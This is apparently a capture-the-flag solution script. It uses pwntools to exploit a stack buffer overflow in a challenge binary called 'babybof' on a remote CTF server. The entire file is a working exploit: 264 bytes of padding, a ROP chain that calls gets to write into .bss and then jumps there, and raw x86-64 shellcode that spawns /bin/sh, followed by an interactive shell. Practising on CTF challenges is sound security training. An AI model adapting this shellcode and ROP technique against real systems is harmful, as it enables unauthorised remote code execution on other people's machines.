#!/usr/bin/env python3

from pwn import *

#p = process('./babybof')
p = remote('chals20.cybercastors.com', 14425)

# 64bits arch - shellcode /bin/sh
buf = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48"
buf += b"\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

pop_rdi = 0x00000000004007f3   # ROPGadget --binary [bin] -> pop rdi; ret
bss = 0x0000000000601068       # __bss_start in Ghidra
gets = 0x00000000004005d0      # gdb info function
padding = b"A"*264             # overflow + 8

payload = padding + p64(pop_rdi) + p64(bss) + p64(gets) + p64(bss)

print(p.recv())
p.sendline(payload)
p.sendline(buf)
p.interactive()
